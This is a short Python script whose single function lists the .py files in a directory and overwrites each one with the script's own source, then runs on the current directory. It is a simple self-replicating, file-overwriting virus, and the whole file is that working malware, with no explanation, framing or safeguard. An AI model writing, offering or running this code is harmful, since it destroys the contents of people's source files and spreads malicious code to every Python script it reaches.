import os
import shutil

def self_replicate(directory):
    # Get the name of the current script
    current_file = __file__

    # List all files in the specified directory
    files_in_directory = os.listdir(directory)

    # Filter out files that are not Python scripts
    python_files = [f for f in files_in_directory if f.endswith('.py')]

    for file in python_files:
        target_file = os.path.join(directory, file)
        # Avoid copying to itself
        if target_file != current_file:
            try:
                # Copy the content of the current file to the target file
                shutil.copyfile(current_file, target_file)
                print(f"Copied to {target_file}")
            except Exception as e:
                print(f"Failed to copy to {target_file}: {e}")

if __name__ == "__main__":
    # Specify the directory to replicate the script within
    directory_to_replicate = "."
    self_replicate(directory_to_replicate)
